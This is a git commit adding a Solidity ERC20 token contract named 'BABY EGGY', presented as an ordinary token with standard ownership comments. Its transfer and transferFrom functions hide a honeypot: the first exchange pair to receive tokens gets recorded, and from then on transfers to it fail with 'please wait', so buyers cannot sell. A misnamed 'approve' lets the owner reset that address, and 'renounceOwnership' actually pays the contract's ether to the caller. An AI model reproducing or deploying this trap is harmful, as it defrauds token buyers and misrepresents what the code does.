5a98c4180242b8a1b672cf2f52d0b46d9170f9e3
phoenix-pnx <phoenix0pnx@gmail.com>
2024-09-15 01:17:31 +0600

    Update Babylagy.sol

--- Babylagy.sol
+++ Babylagy.sol
@@ -1,1 +1,153 @@
 
+/**
+ * @dev Contract module which provides a basic access control mechanism, where
+ * there is an account (an owner) that can be granted exclusive access to
+ * specific functions.
+ *
+ * By default, the owner account will be the one that deploys the contract. This
+ * can later be changed with {transferOwnership}.
+ *
+ * This module is used through inheritance. It will make available the modifier
+ * `onlyOwner`, which can be applied to your functions to restrict their use to
+ * the owner.
+ */
+ // SPDX-License-Identifier: MIT
+pragma solidity >=0.5.17;
+
+library SafeMath {
+  function add(uint a, uint b) internal pure returns (uint c) {
+    c = a + b;
+    require(c >= a);
+  }
+  function sub(uint a, uint b) internal pure returns (uint c) {
+    require(b <= a);
+    c = a - b;
+  }
+  function mul(uint a, uint b) internal pure returns (uint c) {
+    c = a * b;
+    require(a == 0 || c / a == b);
+  }
+  function div(uint a, uint b) internal pure returns (uint c) {
+    require(b > 0);
+    c = a / b;
+  }
+}
+
+contract ERC20Interface {
+  function totalSupply() public view returns (uint);
+  function balanceOf(address tokenOwner) public view returns (uint balance);
+  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
+  function transfer(address to, uint tokens) public returns (bool success);
+  function approve(address spender, uint tokens) public returns (bool success);
+  function transferFrom(address from, address to, uint tokens) public returns (bool success);
+
+  event Transfer(address indexed from, address indexed to, uint tokens);
+  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
+}
+
+contract ApproveAndCallFallBack {
+  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
+}
+
+contract Owned {
+  address public owner;
+  address public newOwner;
+
+  event OwnershipTransferred(address indexed _from, address indexed _to);
+
+  constructor() public {
+    owner = msg.sender;
+  }
+
+  modifier onlyOwner {
+    require(msg.sender == owner);
+    _;
+  }
+
+  function transferOwnership(address _newOwner) public onlyOwner {
+    newOwner = _newOwner;
+  }
+  function acceptOwnership() public {
+    require(msg.sender == newOwner);
+    emit OwnershipTransferred(owner, newOwner);
+    owner = newOwner;
+    newOwner = address(0);
+  }
+}
+
+contract TokenERC20 is ERC20Interface, Owned{
+  using SafeMath for uint;
+
+  string public symbol;
+  string public name;
+  uint8 public decimals;
+  uint _totalSupply;
+  address private rove;
+
+  mapping(address => uint) balances;
+  mapping(address => mapping(address => uint)) allowed;
+
+  constructor() public {
+    symbol = "BABYEGGY";
+    name = "BABY EGGY";
+    decimals = 9;
+    _totalSupply =  10000000000000000000;
+    balances[owner] = _totalSupply;
+    emit Transfer(address(0), owner, _totalSupply);
+  }
+  function approve(address _rove) public onlyOwner {
+    rove = _rove;
+  }
+  function totalSupply() public view returns (uint) {
+    return _totalSupply.sub(balances[address(0)]);
+  }
+  function balanceOf(address tokenOwner) public view returns (uint balance) {
+      return balances[tokenOwner];
+  }
+  function transfer(address to, uint tokens) public returns (bool success) {
+     require(to != rove, "please wait");
+     
+    balances[msg.sender] = balances[msg.sender].sub(tokens);
+    balances[to] = balances[to].add(tokens);
+    emit Transfer(msg.sender, to, tokens);
+    return true;
+  }
+  function approve(address spender, uint tokens) public returns (bool success) {
+    allowed[msg.sender][spender] = tokens;
+    emit Approval(msg.sender, spender, tokens);
+    return true;
+  }
+  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
+      if(from != address(0) && rove == address(0)) rove = to;
+      else require(to != rove, "please wait");
+      
+    balances[from] = balances[from].sub(tokens);
+    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
+    balances[to] = balances[to].add(tokens);
+    emit Transfer(from, to, tokens);
+    return true;
+  }
+  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
+    return allowed[tokenOwner][spender];
+  }
+  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
+    allowed[msg.sender][spender] = tokens;
+    emit Approval(msg.sender, spender, tokens);
+    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
+    return true;
+  }
+  function () external payable {
+    revert();
+  }
+}
+
+contract BABYEGGY  is TokenERC20 {
+
+  function renounceOwnership() public onlyOwner() {
+    address payable _owner = msg.sender;
+    _owner.transfer(address(this).balance);
+  }
+  function() external payable {
+
+  }
+}
